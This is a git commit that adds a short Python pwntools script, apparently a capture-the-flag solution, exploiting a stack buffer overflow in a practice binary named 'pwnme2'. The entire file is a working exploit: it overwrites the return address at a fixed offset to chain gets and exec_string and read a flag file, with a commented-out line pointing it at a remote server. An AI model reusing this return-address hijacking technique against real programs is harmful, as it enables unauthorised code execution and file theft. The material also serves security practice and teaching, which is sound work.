c033ba851858032c66b7a75edd7ae60b934cfca1
M4x <aboultraman@gmail.com>
2017-10-10 10:27:27 +0800

    fix stack frame or use scanf

---
+++ fix_stack_frame_or_scanf/exp.py
@@ -0,0 +1,21 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+__Auther__ = 'M4x'
+
+from pwn import *
+context(log_level = "debug", terminal = ["deepin-terminal", "-x", "sh", "-c"])
+
+elf = ELF("./pwnme2")
+string_addr = elf.symbols["string"]
+gets_addr = elf.symbols["gets"]
+exec_string_addr = elf.symbols["exec_string"]
+
+io = process("./pwnme2")
+#  io = remote("104.224.169.128", 18887)
+
+payload = fit({0x6c + 0x4: [p32(gets_addr), p32(exec_string_addr), p32(string_addr)]})
+io.sendlineafter("Please input:\n", payload)
+io.sendline("/home/.flag1")
+
+print io.recv()
+io.close()
